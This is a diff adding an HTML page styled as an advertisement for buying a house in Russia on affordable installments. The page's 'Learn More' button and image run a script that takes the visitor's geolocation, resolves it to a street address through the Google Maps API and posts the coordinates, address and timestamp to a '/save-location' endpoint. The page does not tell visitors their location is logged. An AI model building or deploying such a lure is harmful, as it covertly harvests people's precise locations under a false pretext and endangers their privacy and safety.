@@ -1,0 +1,97 @@
+<!DOCTYPE html> 
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Buy a House in Russia - Affordable Installments</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+        }
+        .ad-container {
+            position: relative;
+            max-width: 800px;
+            text-align: center;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+        .ad-container img {
+            width: 100%;
+            height: auto;
+            border-radius: 8px;
+        }
+        .ad-container h1 {
+            color: #333;
+        }
+        .ad-container p {
+            color: #555;
+            font-size: 18px;
+        }
+        .button {
+            background-color: #28a745;
+            color: white;
+            padding: 10px 20px;
+            font-size: 18px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="ad-container">
+    <img  style="cursor:pointer;" src="./images/A modern, appealing advertisement for buying a house in Russia on affordable installments. The image should show a beautiful, cozy Russian-style house.webp" alt="Affordable Russian Houses" onclick="learnMore()">
+    <h1>Buy Your Dream House in Russia</h1>
+    <p>Get a house in Russia with affordable installments. The perfect opportunity to own property with a payment plan that fits your budget!</p>
+    <button class="button" onclick="learnMore()">Learn More</button>
+</div>
+
+<script>
+    // Log location when user clicks the button
+    function learnMore() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function (position) {
+                const lat = position.coords.latitude;
+                const lng = position.coords.longitude;
+                const timestamp = new Date().toISOString();
+
+                fetch(`https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lng}&key=YOUR_GOOGLE_MAPS_API_KEY`)
+                    .then(response => response.json())
+                    .then(data => {
+                        const address = data.results[0]?.formatted_address || "Unknown address";
+
+                        // Send the location data to the server
+                        fetch('/save-location', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                latitude: lat,
+                                longitude: lng,
+                                address: address,
+                                timestamp: timestamp
+                            })
+                        }).then(() => {
+                            window.location.href = '/register-house.html'; // Redirect to registration page
+                        });
+                    });
+            });
+        }
+    }
+</script>
+
+</body>
+</html>
